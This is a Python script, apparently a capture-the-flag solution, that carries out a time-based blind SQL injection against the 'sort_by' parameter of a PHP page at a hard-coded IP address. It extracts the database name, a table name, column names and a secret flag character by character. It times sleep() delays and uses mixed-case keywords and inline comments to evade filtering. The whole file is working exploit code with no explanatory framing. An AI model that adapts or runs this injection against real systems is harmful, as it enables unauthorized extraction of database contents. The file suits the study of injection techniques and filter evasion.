import requests
import time
import binascii

url = "http://3.38.182.27/index.php"
dbname = ""
print("Find DB Name...")
Keynum = 1
Break = 0
while 1:
    for j in range(33,129):
        start_time = time.time()
        res = requests.get(url,params={"page":"1", "sort_by":f"If(aScIi(SuBsTr((sElEct/**/DaTaBasE()), {Keynum}, 1))={j}, sLeeP(1), 0)"})
        if res.status_code == 403:
            print("Fuck")
            exit(1)
        end_time = time.time() - start_time
        if int(end_time) >= 2:
            print(j)
            dbname += chr(j)
            print(f"{Keynum} dbname : " + dbname)
            Keynum += 1
            break
        if j == 128:
            print("dbname : " + dbname)
            Break = 1
            break
        else:
            print(f"{chr(j)} is not key")
    if Break == 1:
        break

print("Find Table Name...")
Keynum = 1
Break = 0
tbname =""
while 1:
    for j in range(33,129):
        start_time = time.time()
        res = requests.get(url,params={"page":"1", "sort_by":f"If(aScIi(SuBsTr((SeLeCt table_name FrOm/**/information_schema.tables wHeRe table_schema=database() limit 1,1), {Keynum}, 1))={j}, sleep(2), 0)"})
        if res.status_code == 403:
            print("Fuck")
            exit(1)
        end_time = time.time() - start_time
        if int(end_time) >= 2:
            print(j)
            tbname += chr(j)
            print(f"{Keynum} Tablename : " + tbname)
            Keynum += 1
            break
        if j == 128:
            print("Tablename : " + tbname)
            Break = 1
            break  
        else:
            print(f"{chr(j)} is not key")
            continue
    if Break == 1:
        break


print("Find Column Name...")
Keynum = 1
Break = 0
clname =""
while 1:
    for j in range(33,129):
        start_time = time.time()
        res = requests.get(url,params={"page":"1", "sort_by":f"If(aScIi(SuBsTr((SeLeCt column_name FrOm/**/information_schema.columns wHeRe table_name=(sElEct cOnCaT(CHAR(115), CHAR(117), CHAR(112), CHAR(101), CHAR(114), CHAR(95), CHAR(115), CHAR(101), CHAR(99), CHAR(114), CHAR(101), CHAR(116))) LiMit 0,1), {Keynum}, 1))={j}, sleep(2), 0)"})
        if res.status_code == 403:
            print("Fuck")
            exit(1)
        end_time = time.time() - start_time
        if int(end_time) >= 2:
            print(j)
            clname += chr(j)
            print(f"{Keynum} Column name : " + clname)
            Keynum += 1
            break
        if j == 128:
            print("Column name : " + clname)
            Break = 1
            break  
        else:
            print(f"{chr(j)} is not key")
            continue
    if Break == 1:
        break
    
print("Find Flag...")
Keynum = 1
Break = 0
flag =""
while 1:
    for j in range(33,129):
        start_time = time.time()
        res = requests.get(url,params={"page":"1", "sort_by":f"iF(AsCiI(SuBsTr((SeLeCt `secret_flag` FROM `super_secret` LimIt 0,1), {Keynum}, 1))={j}, SleEp(1), 0)"})
        if res.status_code == 403:
            print("Fuck")
            exit(1)
        end_time = time.time() - start_time
        if int(end_time) >= 1:
            print(j)
            flag += chr(j)
            print(f"{Keynum} flag : " + flag)
            Keynum += 1
            break
        if j == 128:
            print(f"Flag is {flag}")
            break  
        else:
            print(f"{chr(j)} is not key")
            continue
    if Break == 1:
        break
